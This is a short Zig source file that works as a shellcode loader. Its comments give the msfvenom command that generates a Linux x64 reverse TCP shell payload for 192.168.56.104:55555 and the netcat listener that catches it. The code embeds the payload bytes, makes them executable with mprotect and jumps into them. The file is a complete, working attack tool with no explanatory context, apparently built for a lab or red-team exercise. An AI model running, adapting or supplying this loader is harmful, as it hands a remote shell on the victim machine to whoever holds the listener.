// docker run --rm -v $(pwd):/tmp -it --entrypoint ./msfvenom metasploitframework/metasploit-framework -p linux/x64/shell_reverse_tcp -a x64 LHOST=192.168.56.104 LPORT=55555 --platform linux -f zig -o /tmp/payload.zig
// nc -nvl 192.168.56.104 55555

const std = @import("std");

pub fn main() !void {
    @setRuntimeSafety(false);

    const buf: []const u8 = &.{ 0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 0xb9, 0x02, 0x00, 0xd9, 0x03, 0xc0, 0xa8, 0x38, 0x68, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05 };

    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();

    const allocator = arena.allocator();

    const code = try allocator.alloc(u8, std.heap.pageSize());
    errdefer allocator.free(code);

    const pcode = std.mem.alignInSlice(code, std.heap.pageSize()) orelse return;

    @memcpy(pcode, buf);

    if (0 != std.os.linux.mprotect(
        @as([*]const u8, @ptrCast(pcode)),
        std.heap.pageSize(),
        .{
            .EXEC = true,
            .READ = true,
            .WRITE = true,
        },
    )) {
        return;
    }

    const funcPtr1: *const fn () void = @as(*const fn () void, @ptrCast(pcode));

    funcPtr1();
}
